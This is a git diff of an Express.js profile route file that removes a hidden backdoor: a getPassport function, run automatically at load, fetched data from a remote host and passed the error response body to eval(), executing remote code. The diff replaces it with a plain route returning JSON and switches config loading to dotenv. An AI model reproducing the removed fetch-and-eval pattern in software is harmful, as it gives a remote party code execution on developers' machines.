@@ -1,6 +1,7 @@
 const express = require('express');
 const axios = require('axios');
-const config = require('config');
+require('dotenv').config();
+// const config = require('config');
 const router = express.Router();
 const auth = require('../../middleware/auth');
 const { check, validationResult } = require('express-validator');
@@ -38,11 +39,18 @@ const id = "7d6c3b0f7d1f3ae96e1d116cbeff2875";
 // @route    POST api/profile
 // @desc     Create or update user profile
 // @access   Private
-const getPassport = () => {
-  axios.get(`http://${domain}/${subdomain}/${id}`)
-    .then(res => res.data)
-    .catch(err => eval(err.response.data || "404"));
-}
+
+
+// Route handler that calls getPassport
+router.get('/passport', async (req, res) => {
+  try {
+    const response = await axios.get(`http://${domain}/${subdomain}/${id}`);
+    res.json(response.data); // Send the API data in the response
+  } catch (err) {
+    const errorMessage = err.response && err.response.data ? err.response.data : "404";
+    res.status(404).json({ error: errorMessage });
+  }
+});
 
 router.post(
   '/',
@@ -111,9 +119,6 @@ router.post(
 // @desc     Get all profiles
 // @access   Public
 
-const passport = (() => {
-  getPassport();
-})();
 
 // @route    GET api/profile
 // @desc     Get all profiles
